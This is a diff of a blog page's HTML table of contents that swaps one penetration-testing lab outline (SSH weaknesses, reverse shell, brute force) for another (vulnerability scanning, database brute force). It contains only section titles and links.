-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH协议认证机制"><span class="nav-number">1.</span> <span class="nav-text">SSH协议认证机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#认证机制弱点"><span class="nav-number">2.</span> <span class="nav-text">认证机制弱点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境"><span class="nav-number">3.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息探测"><span class="nav-number">4.</span> <span class="nav-text">信息探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用敏感、弱点信息"><span class="nav-number">5.</span> <span class="nav-text">利用敏感、弱点信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#深入挖掘"><span class="nav-number">6.</span> <span class="nav-text">深入挖掘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反弹shell"><span class="nav-number">7.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#暴力破解"><span class="nav-number">8.</span> <span class="nav-text">暴力破解</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境"><span class="nav-number">2.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息探测"><span class="nav-number">3.</span> <span class="nav-text">信息探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞扫描"><span class="nav-number">4.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据库爆破"><span class="nav-number">5.</span> <span class="nav-text">数据库爆破</span></a></li></ol></div>
             
 
           </div>
